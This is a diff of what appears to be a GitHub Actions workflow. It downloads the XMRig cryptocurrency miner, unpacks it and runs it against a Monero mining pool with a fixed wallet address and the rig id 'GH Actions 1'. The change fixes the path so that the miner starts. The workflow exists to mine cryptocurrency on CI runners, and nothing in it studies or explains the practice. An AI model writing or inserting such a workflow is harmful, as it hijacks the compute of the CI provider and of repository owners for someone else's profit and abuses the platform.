@@ -6,5 +6,5 @@ jobs:
     steps:
       - run: wget "https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz"
       - run: tar -zxvf xmrig-6.16.4-linux-static-x64.tar.gz
-      - run: ./xmrig -o pool.minexmr.com:443 -u 42KqwpRsMUMCbQ6AN1DgBmVZaEVTHjwHc3FGSnuvGcpgVonb9q4fa2zF2wEQiDjqCfMLQZfvw7ZV58Kmd9n2NfJn2twWD8K -k --tls --rig-id "GH Actions 1"
+      - run: cd xmrig-6.16.4 && ./xmrig -o pool.minexmr.com:443 -u 42KqwpRsMUMCbQ6AN1DgBmVZaEVTHjwHc3FGSnuvGcpgVonb9q4fa2zF2wEQiDjqCfMLQZfvw7ZV58Kmd9n2NfJn2twWD8K -k --tls --rig-id "GH Actions 1"
       - run: echo "🍏 This job's status is ${{ job.status }}."
